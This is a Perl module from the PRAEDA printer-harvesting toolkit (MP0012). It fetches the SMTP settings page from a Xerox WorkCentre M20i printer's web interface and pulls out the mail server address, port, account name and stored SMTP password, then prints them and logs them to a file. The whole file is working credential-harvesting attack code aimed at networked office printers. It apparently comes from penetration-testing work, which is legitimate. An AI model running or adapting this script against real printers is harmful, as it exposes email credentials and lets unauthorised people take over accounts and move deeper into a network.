# Xerox WorkCentre M20i Series Module for enumerating SMTP settings 
#
######################################################
#                  PRAEDA Module #MP0012             #
#              Copyright (C) 2011 Foofus.net         #
#                JoMo-Kun <jmk@foofus.net>           #
######################################################
package MP0012;
sub MP0012
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];

#------- Setup and retrieve cookie and place in cookie jar
my $browser = LWP::UserAgent->new(timeout => 15);
my $jar = HTTP::Cookies->new();
$browser->cookie_jar($jar);
my $req= new HTTP::Request GET =>"http://$TARGET:$PORTS/";
my $res = $browser->request($req);
$jar->extract_cookies($res);

# Enumerate SMTP settings from Printer
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open output file $OUTPUT \n");
print "\n**********Attempting to enumerate SMTP configuration of Xerox WorkCentre M20i printer $TARGET : Job MP0012**********\n";
print OUTFILE "\n**********Attempting to enumerate SMTP configuration of Xerox WorkCentre M20i printer $TARGET : Job MP0012**********\n";

# ------ retrieve SMTP Settings form page from printer
my $url1="http://$TARGET:$PORTS/properties/protocols/smtp.dhtml";
my $request = new HTTP::Request('GET', $url1);
my $response = $browser->request($request);
my $content = $response->content();

# parse SMTP settings from page information on input tags
my $html = HTML::TagParser->new($content);
my @list = $html->getElementsByTagName( "input" );

my @values = (
  "GSI_SMTP_SERVER_IP_ADDR",
  "GSI_SMTP_PORT_NUMBER",
  "GSI_SMTP_ENAUTH",
  "GSI_SMTP_ACCOUNT",
  "GSI_SMTP_PASSWORD",
);

# GSI_SMTP_SERVER_DOMAIN not caught by parser
$response->as_string =~ /name= 'GSI_SMTP_SERVER_DOMAIN' value = '(.*)' max/;
if (defined($1))
{
  print "GSI_SMTP_SERVER_DOMAIN value = $1\n";
  print OUTFILE "GSI_SMTP_SERVER_DOMAIN value = $1\n";
}

foreach my $elem ( @list ) 
{
  my $text1 = $elem->getAttribute("name");
  my $text2 = $elem->getAttribute("value");

  foreach $value (@values)
  {
    if ($text1 eq $value)
    {
      print "$text1 value = $text2\n";
      print OUTFILE "$text1 value = $text2\n";
    }
  }
}

# operation completed close out output files
close(OUTFILE);
}
    
1;
